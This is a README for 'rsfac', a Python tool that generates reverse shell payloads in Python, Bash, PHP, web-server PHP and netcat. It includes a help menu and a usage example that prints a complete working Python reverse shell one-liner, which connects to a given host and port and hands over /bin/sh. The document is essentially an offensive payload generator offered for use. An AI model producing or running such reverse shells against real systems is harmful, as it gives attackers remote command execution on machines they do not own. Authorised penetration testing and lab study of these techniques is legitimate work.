<h1 align="center">rsfac</h1>
<p align="center">Reverse Shell Factory</p>
<p align="center">It is simple to create many types of reverse shell by command line.</p>
<p align="center"> 
   <img src="https://img.shields.io/badge/language-python-blue.svg">
</p>

<p align="center">Tell me if you find any errors. :)</p>

***

## Help Menu
```
    ------Help Menu------
    Reverse Shell Factory
    v.1
    
    Usage Method:
    python3 rsfac.py <args>
    
    Example:
    python3 rsfac.py l=py h=192.168.1.10 p=4444
    
    
    -Commands-----------
    h=        Local Host
    p=        Local Port
    l=           Payload
    help       Help Menu
    
    
    -Reverse Shell Payloads------
    py              Simple Python
    py3            Simple Python3
    bash              Simple Bash
    php                Simple PHP
    php2       Second Type of PHP
    phpw     Shell For Web Server
    phpw2   Simple For Web Server
    nc          Some Types Netcat

```
## Usage Example

```
python3 rsfac.py h=192.168.1.10 p=4444 l=py
./rsfac h=192.168.1.10 p=4444 l=py

Reverse Shell Factory

Local Host: 192.168.1.10
Local Port: 4444
Type: py

Simple Python

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

```
